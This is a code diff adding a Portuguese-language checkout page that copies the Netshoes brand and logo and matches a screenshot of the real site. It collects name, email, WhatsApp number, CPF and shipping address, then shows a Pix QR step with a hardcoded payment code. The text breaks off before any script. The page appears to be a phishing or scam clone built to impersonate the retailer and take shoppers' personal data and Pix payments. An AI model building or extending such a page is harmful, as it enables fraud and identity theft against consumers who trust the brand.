@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Finalizar compra | Netshoes</title>
+  <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD/AIL//wCC//8Agv//AIL//wCC//8Agf//AID//wCA//8AgP//AID//wCA//8AgP//AID//wCA//8AgP//AID//wCC//8Agv//AIL//wCC//8Agv//AIH//wCA//8AgP//AID//wCA//8AgP//AID//wCA//8AgP//AID//wCA//8Agv//AIL//wCC//8Agv//AIL//wCB//8AgP//AID//wCA//8Af///AID//wCA//8AgP//AID//wCA//8AgP//AIL//wCC//8Dg///BYP//wOC//8Agf//AIH//wCA//8Gg///DYf//wWC//8AgP//AIH//wCB//8Agf//AIH//wCC//8Agf//R6X//5vO//9xuv//CYb//wCB//8smP//mMz//7fc//+QyP//LJf//wCB//8Agv//AIL//wCC//8Agv//AID//1qt///5/P//1ev//x6R//8Jhv//pNL//////////////////7nd//8bj///AIH//wCC//8Agv//AIL//wCB//80mv//5/P//+/3//89n///I5P//9zu////////xuP//97v///6/f//ZLP//wCB//8Agv//AIL//wCC//8Agf//GI7//8rl///9/v//YrH//0Cg///v+P//+vz//2Wz//+Syf///////6LR//8Hhf//AIL//wCC//8Agv//AIL//weF//+j0v///////5HJ//9ls///+vz//+/4//9AoP//Y7L///3+///K5f//F43//wCB//8Agv//AIL//wCC//8Agf//ZbP///r9///c7v//xOL////////c7v//JJP//z2f///v9///5/P//zOa//8Agf//AIL//wCC//8Agv//AIH//x2Q//+73v//////////////////pdP//wmG//8fkf//1uv///n8//9Zrf//AID//wCC//8Agv//AIL//wCC//8Agf//Lpj//5TK//+63f//ms7//y6Z//8Agf//CYb//3W7//+f0P//SKX//wCB//8Agv//AIL//wCC//8Agv//AIL//wCB//8FhP//Don//weF//8Agv//AIL//wCC//8Dg///BYT//wOD//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCB//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL//wCC//8Agv//AIL/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" type="image/x-icon">
+  <link rel="stylesheet" href="assets/fonts.css">
+  <style>
+    :root {
+      --ns-purple: #5c00c4;
+      --ns-purple-hover: #480099;
+      --ns-purple-dark: #30006b;
+      --ns-purple-light: #f3eaff;
+      --ns-purple-border: #cfb2f7;
+      --ns-green: #24b462;
+      --ns-green-dark: #198754;
+      --ns-green-bg: #eafaf1;
+      --ns-text-dark: #23282e;
+      --ns-text-subtle: #70757a;
+      --ns-text-muted: #8e9295;
+      --ns-border: #ebebed;
+      --ns-border-input: #d8d9dc;
+      --ns-bg: #f8f8fa;
+      --ns-card: #ffffff;
+      --ns-yellow-badge: #fff8e6;
+      --ns-yellow-text: #b25e00;
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-lg: 16px;
+      --shadow-card: 0 2px 10px rgba(0, 0, 0, 0.04), 0 1px 3px rgba(0, 0, 0, 0.02);
+      --shadow-elevated: 0 8px 30px rgba(0, 0, 0, 0.08);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Netshoes Ritmo Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--ns-bg);
+      color: var(--ns-text-dark);
+      -webkit-font-smoothing: antialiased;
+      line-height: 1.4;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* TOP HEADER */
+    .checkout-header {
+      background-color: var(--ns-card);
+      border-bottom: 1px solid var(--ns-border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .checkout-header__container {
+      max-width: 1060px;
+      margin: 0 auto;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .checkout-header__logo {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+      color: var(--ns-purple);
+      transition: opacity 0.2s;
+    }
+
+    .checkout-header__logo:hover {
+      opacity: 0.85;
+    }
+
+    .checkout-header__logo svg {
+      height: 26px;
+      width: auto;
+    }
+
+    .checkout-header__security {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--ns-green-dark);
+      background: var(--ns-green-bg);
+      padding: 6px 12px;
+      border-radius: 20px;
+      border: 1px solid rgba(36, 180, 98, 0.2);
+    }
+
+    .checkout-header__security svg {
+      width: 16px;
+      height: 16px;
+      fill: var(--ns-green);
+    }
+
+    /* MAIN CONTAINER */
+    .checkout-main {
+      flex: 1;
+      max-width: 1060px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 28px 20px 60px;
+    }
+
+    .checkout-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+      margin-bottom: 24px;
+      letter-spacing: -0.3px;
+    }
+
+    /* STEPPER */
+    .stepper {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 620px;
+      margin-bottom: 32px;
+      position: relative;
+    }
+
+    .stepper__step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      position: relative;
+      z-index: 2;
+      background: var(--ns-bg);
+      padding: 0 6px;
+      cursor: default;
+    }
+
+    .stepper__badge {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 700;
+      background-color: #e5e7eb;
+      color: #9ca3af;
+      transition: all 0.3s ease;
+    }
+
+    .stepper__step.active .stepper__badge {
+      background-color: var(--ns-purple);
+      color: #ffffff;
+      box-shadow: 0 0 0 4px var(--ns-purple-light);
+    }
+
+    .stepper__step.completed .stepper__badge {
+      background-color: var(--ns-text-dark);
+      color: #ffffff;
+    }
+
+    .stepper__label {
+      font-size: 13px;
+      font-weight: 500;
+      color: #9ca3af;
+      transition: color 0.3s ease;
+    }
+
+    .stepper__step.active .stepper__label {
+      color: var(--ns-text-dark);
+      font-weight: 700;
+    }
+
+    .stepper__step.completed .stepper__label {
+      color: var(--ns-text-dark);
+    }
+
+    .stepper__line {
+      position: absolute;
+      top: 16px;
+      left: 30px;
+      right: 30px;
+      height: 2px;
+      background-color: #e5e7eb;
+      z-index: 1;
+    }
+
+    .stepper__line-progress {
+      height: 100%;
+      width: 0%;
+      background-color: var(--ns-purple);
+      transition: width 0.4s ease;
+    }
+
+    /* GRID LAYOUT */
+    .checkout-grid {
+      display: grid;
+      grid-template-columns: 1fr 370px;
+      gap: 28px;
+      align-items: start;
+    }
+
+    /* CARDS & ACCORDION */
+    .step-card {
+      background: var(--ns-card);
+      border: 1px solid var(--ns-border);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      margin-bottom: 20px;
+      box-shadow: var(--shadow-card);
+      transition: all 0.3s ease;
+    }
+
+    .step-card.active {
+      border-color: var(--ns-purple-border);
+      box-shadow: 0 4px 18px rgba(92, 0, 196, 0.06);
+    }
+
+    .step-card.disabled {
+      background: #fafafb;
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    .step-card__header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .step-card__title-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .step-card__num {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 700;
+      background: var(--ns-text-dark);
+      color: #ffffff;
+    }
+
+    .step-card.disabled .step-card__num {
+      background: #c5c7c9;
+      color: #ffffff;
+    }
+
+    .step-card.active .step-card__num {
+      background: var(--ns-purple);
+      color: #ffffff;
+    }
+
+    .step-card__title {
+      font-size: 17px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+    }
+
+    .step-card.disabled .step-card__title {
+      color: var(--ns-text-muted);
+    }
+
+    .step-card__edit-btn {
+      background: none;
+      border: none;
+      color: var(--ns-purple);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: underline;
+      padding: 4px 8px;
+      border-radius: var(--radius-sm);
+    }
+
+    .step-card__edit-btn:hover {
+      color: var(--ns-purple-hover);
+      background: var(--ns-purple-light);
+    }
+
+    .step-card__summary {
+      margin-top: 10px;
+      padding-left: 40px;
+      font-size: 13px;
+      color: var(--ns-text-subtle);
+      line-height: 1.5;
+    }
+
+    .step-card__body {
+      margin-top: 20px;
+    }
+
+    /* FORMS & INPUTS */
+    .form-group {
+      margin-bottom: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .form-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--ns-text-dark);
+    }
+
+    .form-input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .form-input, .form-select {
+      width: 100%;
+      height: 46px;
+      padding: 0 14px;
+      font-size: 14px;
+      color: var(--ns-text-dark);
+      background: #ffffff;
+      border: 1px solid var(--ns-border-input);
+      border-radius: var(--radius-sm);
+      outline: none;
+      transition: all 0.2s ease;
+      font-family: inherit;
+    }
+
+    .form-input::placeholder {
+      color: #a0a4a8;
+    }
+
+    .form-input:focus, .form-select:focus {
+      border-color: var(--ns-purple);
+      box-shadow: 0 0 0 3px rgba(92, 0, 196, 0.12);
+    }
+
+    .form-input.is-invalid {
+      border-color: #dc3545;
+      background-color: #fff9f9;
+    }
+
+    .form-error {
+      font-size: 12px;
+      color: #dc3545;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .form-error.visible {
+      display: block;
+    }
+
+    .input-spinner {
+      position: absolute;
+      right: 12px;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #e5e7eb;
+      border-top-color: var(--ns-purple);
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* BUTTONS */
+    .btn-checkout {
+      width: 100%;
+      height: 48px;
+      background-color: var(--ns-purple);
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+      box-shadow: 0 3px 10px rgba(92, 0, 196, 0.25);
+      margin-top: 18px;
+      font-family: inherit;
+    }
+
+    .btn-checkout:hover {
+      background-color: var(--ns-purple-hover);
+      box-shadow: 0 5px 14px rgba(92, 0, 196, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-checkout:active {
+      transform: translateY(0);
+      background-color: var(--ns-purple-dark);
+    }
+
+    /* FRETE CARD */
+    .shipping-method {
+      background: var(--ns-green-bg);
+      border: 1px solid rgba(36, 180, 98, 0.35);
+      border-radius: var(--radius-sm);
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 14px;
+    }
+
+    .shipping-method__info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .shipping-method__icon {
+      width: 22px;
+      height: 22px;
+      fill: var(--ns-green-dark);
+    }
+
+    .shipping-method__text {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--ns-green-dark);
+    }
+
+    .shipping-method__badge {
+      background: var(--ns-green);
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 6px;
+      text-transform: uppercase;
+    }
+
+    /* STEP 3 - PAYMENT / PIX (MATCHING SCREENSHOT 1) */
+    .payment-pix-card {
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .payment-pix__title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+      margin-bottom: 6px;
+    }
+
+    .payment-pix__subtitle {
+      font-size: 13px;
+      color: var(--ns-text-subtle);
+      max-width: 440px;
+      margin: 0 auto 20px;
+    }
+
+    .payment-pix__qr-box {
+      display: inline-block;
+      background: #ffffff;
+      border: 1px solid var(--ns-border);
+      border-radius: var(--radius-md);
+      padding: 14px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.04);
+      margin-bottom: 20px;
+    }
+
+    #pix-qrcode {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 210px;
+      height: 210px;
+    }
+
+    #pix-qrcode img, #pix-qrcode canvas {
+      display: block;
+      width: 100% !important;
+      height: 100% !important;
+    }
+
+    .payment-pix__copy-wrap {
+      display: flex;
+      gap: 8px;
+      max-width: 480px;
+      margin: 0 auto 18px;
+    }
+
+    .payment-pix__copy-input {
+      flex: 1;
+      height: 46px;
+      background: #f8f9fa;
+      border: 1px solid var(--ns-border-input);
+      border-radius: var(--radius-sm);
+      padding: 0 14px;
+      font-size: 13px;
+      color: #55595d;
+      font-family: monospace;
+      outline: none;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+
+    .payment-pix__copy-btn {
+      padding: 0 24px;
+      height: 46px;
+      background-color: var(--ns-purple);
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+      white-space: nowrap;
+      font-family: inherit;
+    }
+
+    .payment-pix__copy-btn:hover {
+      background-color: var(--ns-purple-hover);
+    }
+
+    .payment-pix__copy-btn.copied {
+      background-color: var(--ns-green);
+    }
+
+    .payment-pix__status {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--ns-text-subtle);
+      margin-top: 14px;
+    }
+
+    .payment-pix__pulse {
+      width: 10px;
+      height: 10px;
+      background-color: var(--ns-green);
+      border-radius: 50%;
+      position: relative;
+    }
+
+    .payment-pix__pulse::after {
+      content: '';
+      position: absolute;
+      top: -3px;
+      left: -3px;
+      right: -3px;
+      bottom: -3px;
+      border-radius: 50%;
+      border: 2px solid var(--ns-green);
+      animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
+    }
+
+    @keyframes pulse-ring {
+      0% { transform: scale(0.6); opacity: 1; }
+      100% { transform: scale(1.8); opacity: 0; }
+    }
+
+    .payment-pix__timer {
+      font-size: 12px;
+      color: var(--ns-text-muted);
+      margin-top: 6px;
+    }
+
+    /* RIGHT COLUMN: ORDER SUMMARY */
+    .order-summary {
+      background: var(--ns-card);
+      border: 1px solid var(--ns-border);
+      border-radius: var(--radius-lg);
+      padding: 22px;
+      box-shadow: var(--shadow-card);
+      position: sticky;
+      top: 80px;
+    }
+
+    .order-summary__title {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+      margin-bottom: 18px;
+    }
+
+    .order-summary__product {
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .order-summary__thumb {
+      width: 68px;
+      height: 68px;
+      border-radius: var(--radius-sm);
+      object-fit: cover;
+      border: 1px solid var(--ns-border);
+      background: #fbfafb;
+      flex-shrink: 0;
+    }
+
+    .order-summary__prod-info {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .order-summary__prod-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--ns-text-dark);
+      line-height: 1.3;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+
+    .order-summary__prod-meta {
+      font-size: 12px;
+      color: var(--ns-text-muted);
+    }
+
+    .order-summary__prod-price {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+      margin-top: 2px;
+    }
+
+    .order-summary__divider {
+      height: 1px;
+      background-color: var(--ns-border);
+      margin: 14px 0;
+    }
+
+    .order-summary__row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      color: var(--ns-text-subtle);
+      margin-bottom: 8px;
+    }
+
+    .order-summary__row--free {
+      color: var(--ns-green-dark);
+      font-weight: 600;
+    }
+
+    .order-summary__row--total {
+      margin-top: 6px;
+      margin-bottom: 4px;
+    }
+
+    .order-summary__row--total .order-summary__label {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--ns-text-dark);
+    }
+
+    .order-summary__row--total .order-summary__val {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--ns-text-dark);
+    }
+
+    .order-summary__discount-note {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--ns-green-dark);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .order-summary__trust {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding-top: 14px;
+      border-top: 1px solid var(--ns-border);
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--ns-green-dark);
+    }
+
+    .order-summary__trust svg {
+      width: 16px;
+      height: 16px;
+      fill: var(--ns-green);
+    }
+
+    .order-summary__perks {
+      margin-top: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      font-size: 11px;
+      color: var(--ns-text-muted);
+    }
+
+    .order-summary__perk-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .order-summary__perk-item svg {
+      width: 12px;
+      height: 12px;
+      fill: var(--ns-purple);
+      flex-shrink: 0;
+    }
+
+    /* TOAST FEEDBACK */
+    .toast-copy {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #1e1e24;
+      color: #ffffff;
+      padding: 12px 20px;
+      border-radius: 30px;
+      font-size: 14px;
+      font-weight: 600;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      z-index: 1000;
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      pointer-events: none;
+    }
+
+    .toast-copy.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .toast-copy svg {
+      width: 18px;
+      height: 18px;
+      fill: var(--ns-green);
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 860px) {
+      .checkout-grid {
+        grid-template-columns: 1fr;
+      }
+      .order-summary {
+        position: static;
+        order: -1;
+        margin-bottom: 20px;
+      }
+      .checkout-main {
+        padding: 20px 14px 40px;
+      }
+      .stepper {
+        margin-bottom: 24px;
+      }
+      .payment-pix__copy-wrap {
+        flex-direction: column;
+      }
+      .payment-pix__copy-btn {
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="checkout-header">
+    <div class="checkout-header__container">
+      <a href="index.html" class="checkout-header__logo" title="Voltar para o produto">
+        <!-- Authentic Netshoes SVG Logo -->
+        <svg width="170" height="32" viewBox="0 0 170 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M34.1773 16.9898C33.2366 21.3484 32.3449 22.4381 31.4042 22.4381C30.0166 22.4381 29.8696 21.1015 29.3738 17.9795L27.9862 9.70718C26.7966 2.52644 23.0318 0.000244141 17.5835 0.000244141C10.1048 0.000244141 5.54825 4.85469 3.41793 15.0085L0 31.2553H9.658L13.0759 15.0085C14.0166 10.6498 14.9084 9.56019 15.8491 9.56019C17.2366 9.56019 17.3836 10.8968 17.8795 14.0188L19.267 22.2911C20.4566 29.4738 24.2195 32 29.6678 32C37.1465 32 41.703 27.1456 43.8334 16.9918L47.2533 0.743012H37.5953L34.1773 16.9898Z" fill="#5c00c4"/>
+          <path d="M169.991 0.00982503V0.00590541L150.032 0.00786522V0.0117848H147.481L142.648 24.3526H130.885L135.69 0.00982503H119.9L111.224 12.484L107.285 0.00982503H82.4265V0.00590541L69.1644 2.59858e-05C60.8763 -0.00977306 56.3314 2.7516 55.0968 8.59967C54.1992 12.8583 55.5534 16.2174 60.9703 18.3301L67.2085 20.7779C69.5661 21.6794 70.5872 22.0165 70.3579 23.1003C70.2031 23.8352 69.2036 24.3526 65.6426 24.3702L52.3804 24.3624L50.7871 31.9116L64.0492 31.9194C72.3373 31.9292 76.8821 29.1679 78.1168 23.3198C79.0144 19.0611 77.6602 15.702 72.2432 13.5893L66.0051 11.1415C63.6475 10.24 62.6264 9.90294 62.8557 8.81917C63.0105 8.08424 64.01 7.56685 67.571 7.54921L76.9821 7.55509H80.4764H80.8331H86.6597L81.8287 31.8979H89.8953L94.7263 7.55509H101.405L106.064 20.7838L103.859 31.8979H111.926L114.13 20.7838L127.349 3.03773L121.619 31.8979H163.706L165.188 24.3487H150.417L151.512 18.9083H164.831L166.144 12.2488H152.825L153.74 7.55509H168.514L169.364 3.21019L169.991 0.00982503Z" fill="#5c00c4"/>
+        </svg>
+      </a>
+
+      <div class="checkout-header__security">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+        <span>Ambiente seguro</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main class="checkout-main">
+    <h1 class="checkout-title">Finalizar compra</h1>
+
+    <!-- STEPPER -->
+    <div class="stepper" id="checkout-stepper">
+      <div class="stepper__line">
+        <div class="stepper__line-progress" id="stepper-progress"></div>
+      </div>
+
+      <div class="stepper__step active" id="step-nav-1">
+        <div class="stepper__badge">1</div>
+        <span class="stepper__label">Identificação</span>
+      </div>
+
+      <div class="stepper__step" id="step-nav-2">
+        <div class="stepper__badge">2</div>
+        <span class="stepper__label">Entrega</span>
+      </div>
+
+      <div class="stepper__step" id="step-nav-3">
+        <div class="stepper__badge">3</div>
+        <span class="stepper__label">Pagamento</span>
+      </div>
+    </div>
+
+    <!-- 2-COLUMNS CONTENT -->
+    <div class="checkout-grid">
+
+      <!-- LEFT: STEPS -->
+      <div class="checkout-steps">
+
+        <!-- STEP 1: IDENTIFICAÇÃO -->
+        <section class="step-card active" id="card-step-1">
+          <div class="step-card__header">
+            <div class="step-card__title-wrap">
+              <span class="step-card__num" id="badge-step-1">1</span>
+              <span class="step-card__title">Identificação</span>
+            </div>
+            <button type="button" class="step-card__edit-btn" id="edit-step-1" style="display:none;">Editar</button>
+          </div>
+
+          <!-- Collapsed Summary -->
+          <div class="step-card__summary" id="summary-step-1" style="display:none;"></div>
+
+          <!-- Active Form -->
+          <form class="step-card__body" id="form-step-1">
+            <div class="form-group">
+              <label class="form-label" for="client-name">Nome completo</label>
+              <div class="form-input-wrap">
+                <input type="text" id="client-name" class="form-input" placeholder="Seu nome completo" required autocomplete="name">
+              </div>
+              <span class="form-error" id="err-client-name">Por favor, informe seu nome completo</span>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label" for="client-email">E-mail</label>
+              <div class="form-input-wrap">
+                <input type="email" id="client-email" class="form-input" placeholder="voce@email.com" required autocomplete="email">
+              </div>
+              <span class="form-error" id="err-client-email">Por favor, informe um e-mail válido</span>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label" for="client-phone">WhatsApp</label>
+              <div class="form-input-wrap">
+                <input type="tel" id="client-phone" class="form-input" placeholder="(11) 91234-5678" maxlength="15" required autocomplete="tel">
+              </div>
+              <span class="form-error" id="err-client-phone">Por favor, informe um número de telefone com DDD</span>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label" for="client-cpf">CPF</label>
+              <div class="form-input-wrap">
+                <input type="text" id="client-cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
+              </div>
+              <span class="form-error" id="err-client-cpf">Por favor, informe um CPF válido</span>
+            </div>
+
+            <button type="submit" class="btn-checkout" id="btn-to-step-2">Ir para entrega</button>
+          </form>
+        </section>
+
+        <!-- STEP 2: ENTREGA -->
+        <section class="step-card disabled" id="card-step-2">
+          <div class="step-card__header">
+            <div class="step-card__title-wrap">
+              <span class="step-card__num" id="badge-step-2">2</span>
+              <span class="step-card__title">Entrega</span>
+            </div>
+            <button type="button" class="step-card__edit-btn" id="edit-step-2" style="display:none;">Editar</button>
+          </div>
+
+          <!-- Collapsed Summary -->
+          <div class="step-card__summary" id="summary-step-2" style="display:none;"></div>
+
+          <!-- Active Form -->
+          <form class="step-card__body" id="form-step-2" style="display:none;">
+            <div class="form-group">
+              <label class="form-label" for="ship-cep">CEP</label>
+              <div class="form-input-wrap">
+                <input type="text" id="ship-cep" class="form-input" placeholder="00000-000" maxlength="9" required autocomplete="postal-code">
+                <div class="input-spinner" id="cep-spinner"></div>
+              </div>
+              <span class="form-error" id="err-ship-cep">Por favor, informe um CEP válido</span>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label" for="ship-address">Endereço</label>
+              <div class="form-input-wrap">
+                <input type="text" id="ship-address" class="form-input" placeholder="Rua, avenida..." required autocomplete="street-address">
+              </div>
+              <span class="form-error" id="err-ship-address">Por favor, informe seu endereço</span>
+            </div>
+
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label" for="ship-number">Número</label>
+                <div class="form-input-wrap">
+                  <input type="text" id="ship-number" class="form-input" placeholder="123" required>
+                </div>
+                <span class="form-error" id="err-ship-number">Obrigatório</span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label" for="ship-complement">Complemento</label>
+                <div class="form-input-wrap">
+                  <input type="text" id="ship-complement" class="form-input" placeholder="Apto, bloco (opcional)">
+                </div>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label" for="ship-neighborhood">Bairro</label>
+              <div class="form-input-wrap">
+                <input type="text" id="ship-neighborhood" class="form-input" placeholder="Seu bairro" required>
+              </div>
+              <span class="form-error" id="err-ship-neighborhood">Por favor, informe o bairro</span>
+            </div>
+
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label" for="ship-city">Cidade</label>
+                <div class="form-input-wrap">
+                  <input type="text" id="ship-city" class="form-input" placeholder="Sua cidade" required>
+                </div>
+                <span class="form-error" id="err-ship-city">Obrigatório</span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label" for="ship-uf">UF</label>
+                <div class="form-input-wrap">
+                  <select id="ship-uf" class="form-select" required>
+                    <option value="">--</option>
+                    <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option>
+                    <option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option>
+                    <option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option>
+                    <option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option>
+                    <option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option>
+                    <option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option>
+                    <option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option>
+                    <option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option>
+                    <option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+                  </select>
+                </div>
+                <span class="form-error" id="err-ship-uf">Selecione</span>
+              </div>
+            </div>
+
+            <!-- Shipping Option Badge -->
+            <div class="shipping-method">
+              <div class="shipping-method__info">
+                <svg class="shipping-method__icon" viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                <span class="shipping-method__text">Frete grátis para todo o Brasil</span>
+              </div>
+              <span class="shipping-method__badge">Grátis</span>
+            </div>
+
+            <button type="submit" class="btn-checkout" id="btn-to-step-3">Ir para pagamento</button>
+          </form>
+        </section>
+
+        <!-- STEP 3: PAGAMENTO (PIX) -->
+        <section class="step-card disabled" id="card-step-3">
+          <div class="step-card__header">
+            <div class="step-card__title-wrap">
+              <span class="step-card__num" id="badge-step-3">3</span>
+              <span class="step-card__title">Pagamento</span>
+            </div>
+          </div>
+
+          <div class="step-card__body payment-pix-card" id="form-step-3" style="display:none;">
+            <h2 class="payment-pix__title">Escaneie para pagar</h2>
+            <p class="payment-pix__subtitle">Abra o app do seu banco e escaneie o QR code, ou use o Pix Copia e Cola.</p>
+
+            <div class="payment-pix__qr-box">
+              <div id="pix-qrcode"></div>
+            </div>
+
+            <div class="payment-pix__copy-wrap">
+              <input type="text" id="pix-copy-input" class="payment-pix__copy-input" readonly value="00020101021226900014br.gov.bcb.pix2568qrcode.netshoes.com.br/pix/v2/cob/c5e9a4f210d742b89a812e947d15204000053039865406287.905802BR5916NETSHOES BRASIL6009SAO PAULO62070503***6304E8A2">
+              <button type="button" class="payment-pix__copy-btn" id="btn-copy-pix">
